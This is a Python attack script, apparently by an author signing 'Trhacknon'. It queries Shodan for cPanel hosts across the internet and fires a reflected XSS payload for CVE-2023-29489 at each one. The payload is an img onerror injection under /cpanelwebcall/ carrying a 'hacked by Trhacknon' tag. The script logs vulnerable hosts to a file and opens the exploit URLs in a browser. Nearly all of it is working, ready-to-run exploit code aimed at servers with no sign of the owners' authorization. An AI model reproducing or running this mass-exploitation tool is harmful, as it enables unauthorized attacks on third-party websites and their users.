import shodan
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import os
import platform
import pystyle
from pystyle import *
import webbrowser
import socket
from pystyle import Colors, Colorate, Write, Box, Center, System, Add

if platform.system() == 'Windows':
    os.system(f'title Exploit XSS CVE-2023-29489  - By Trhacknon')

not_exploit = 0
exploit = 0
error_connect = 0

def logo_start():
    if platform.system() == 'Linux':
        os.system('clear')
    if platform.system() == 'Windows':
        os.system('cls')


logo = """
████╗░░██╗░██████╗░██████╗  ░░███╗░░░█████╗░░░███╗░░███████╗
╚██╗██╔╝██╔════╝██╔════╝  ░████║░░██╔══██╗░████║░░██╔════╝
░╚███╔╝░╚█████╗░╚█████╗░  ██╔██║░░╚██████║██╔██║░░██████╗░
░██╔██╗░░╚═══██╗░╚═══██╗  ╚═╝██║░░░╚═══██║╚═╝██║░░╚════██╗
██╔╝╚██╗██████╔╝██████╔╝  ███████╗░█████╔╝███████╗██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚══════╝░╚════╝░╚══════╝╚═════╝░
\t\t\t\t\t\tBy >> Trhacknon
\t\t\t\t\t\t\tExploit CVE-2023-29489\r\r
"""

resultat = Colorate.Diagonal(Colors.rainbow, Center.XCenter(logo))

# Affichage du résultat
print(resultat)

TRKN_1312 = input("\033[35mVeuillez entrer votre clé API Shodan : \033[0m")



def search_cpanel_hosts(api_key):
    api = shodan.Shodan(api_key)
    query = 'cpanel'
    host_list = []
    try:
        results = api.search(query)
        with open('hosts.txt', 'w') as file:
            for result in results['matches']:
                ip = result['ip_str']
                print(f"\033[33mFound cPanel host: {ip}\033[0m")
                file.write(f"{ip}\n")  # Enregistrer l'IP dans le fichier
                host_list.append(ip)
    except shodan.APIError as e:
        print(f"\033[31mError: {e}\033[0m")
    return host_list

def test_xss(url):
    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312)">hacked%20by%20Trhacknon"""
    xss_url = urljoin(url, hacked_1312 )
    response = requests.get(xss_url, verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    img_tags = soup.find_all('img', src='x')
    for img_tag in img_tags:
        if 'onerror' in img_tag.attrs and img_tag['onerror'] == "prompt(1312)":
            return True
    return False

if __name__ == '__main__':
    from pystyle import *
    from pystyle import Colors
    logo_start()
    for host in search_cpanel_hosts(TRKN_1312):
        for protocol in ['http', 'https']:
            url = f'{protocol}://{host}'
            ip = socket.gethostbyname(host)
            try:
                if test_xss(url):
                    exp = f'[+] Exploit >>> {url} ~ {ip}'

                    # Utilisation de Colorate.Diagonal pour l'effet de couleur et de positionnement
                    expres = Colorate.Diagonal(Colors.rainbow, Center.XCenter(exp))

                    # Affichage du résultat
                    print(expres)
                    exploit +=  1
                    if platform.system() == 'Windows':
                        os.system(
                            f'title Exploit XSS - ({int(exploit)}) Not Exploit - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                        )
                    hacked_1312  = """/cpanelwebcall/<img%20src=x%20onerror="prompt(1312,/by_Trkn/)">hacked%20by%20Trhacknon"""
                    xss_1312 = open("xss_1312.txt","a")
                    xss_1312.write(f"{url}{hacked_1312}\n")
                    xss_1312.close()
                    webbrowser.open(f"{url}{hacked_1312}")
                else:
                    print(Colorate.Diagonal(Colors.red_to_purple, Center.XCenter(f'\033[+]\033 Not Exploit >>>\033 {url} ~ {ip}')))

                    # Affichage du résultat
                    not_exploit += 1
                    if platform.system() == 'Windows':
                        os.system(
                            f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                        )
            except Exception as e:
                print(f'\033[31m[!] Error Exploit >>> {url} ~ {ip} !!')
                error_connect += 1
                if platform.system() == 'Windows':
                    os.system(
                        f'title Exploit XSS - ({int(exploit)}) Not Explot - ({int(not_exploit)}) Error - ({int(error_connect)})  - By Trhacknon'
                    )
